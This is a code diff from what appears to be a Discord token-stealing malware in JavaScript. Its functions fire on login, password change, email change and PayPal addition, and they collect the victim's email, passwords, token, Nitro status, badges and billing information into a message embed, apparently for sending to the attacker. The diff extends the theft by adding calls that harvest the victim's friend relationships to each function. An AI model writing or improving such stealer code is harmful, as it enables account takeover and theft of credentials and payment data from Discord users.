@@ -741,7 +741,7 @@ const login = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
-  const relation = await getRelationships(token)
+  const relation = await getRelationships(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -826,6 +826,7 @@ const passwordChanged = async (oldpassword, newpassword, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const relation = await getRelationships(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -911,6 +912,7 @@ const emailChanged = async (email, password, token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = await getBilling(token);
+  const relation = await getRelationships(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
@@ -991,6 +993,7 @@ const PaypalAdded = async (token) => {
   const nitro = getNitro(json.premium_type);
   const badges = getBadges(json.flags);
   const billing = getBilling(token);
+  const relation = await getRelationships(token);
   const content = {
     username: config.embed_name,
     avatar_url: config.embed_icon,
